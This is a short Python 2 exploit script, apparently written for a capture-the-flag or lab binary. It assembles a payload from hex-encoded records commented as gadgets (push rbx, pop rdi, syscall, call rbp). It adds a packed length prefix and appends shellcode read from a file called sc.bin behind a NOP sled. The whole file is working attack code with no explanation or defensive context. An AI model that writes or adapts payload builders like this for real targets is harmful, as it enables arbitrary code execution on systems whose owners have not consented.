#!/usr/bin/env python

import struct



buf = "00000000000000000000000021498201".decode('hex')		# push rbx 
buf += "00000000000000000000000087014200".decode('hex')		# pop rdi 
buf += "00000000000000000000000021498201".decode('hex')		# push rbx 
buf += "0000000000000000000000007b3e0701".decode('hex')		# pop rax 
buf += "0000000000000000000000005b972701".decode('hex')		# push rbp
buf += "00000000000000000000000041160500".decode('hex')		# pop rsi
buf += "000000000000000000000000f9252fdc".decode('hex')		# syscall
buf += "00000000000000000000000093650000".decode('hex')		# call rbp
print "%s%s"%(struct.pack("<I", len(buf)/16),buf), "\xd5\x90" + open("sc.bin","r").read().rjust(104, "\x90"),#+"\x90" * 3 + "\x90" * 100 + "\xcc",
